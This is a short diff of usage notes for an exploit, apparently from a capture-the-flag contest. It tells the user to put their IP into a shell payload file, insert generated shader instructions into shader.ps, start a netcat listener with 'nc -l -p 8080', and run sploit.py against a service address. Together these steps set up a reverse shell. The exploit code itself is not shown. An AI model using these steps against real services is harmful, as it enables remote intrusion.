@@ -1,3 +1,4 @@
-1. write shell you want to execute in shell.txt
-2. compile and run generate_shader.cpp, this will generate some instruction you should copy to shader.ps, right before mov o27.zw o4.xy
-3. run ./sploit.py <addr>
+1. change ip address in shell.txt to yours
+2. compile and run generate_shader.cpp, this will generate some instruction you should copy to shader.ps, right before mov o283.zw o4.xy
+4. nc -l -p 8080 
+5. ./sploit.py <service addr>
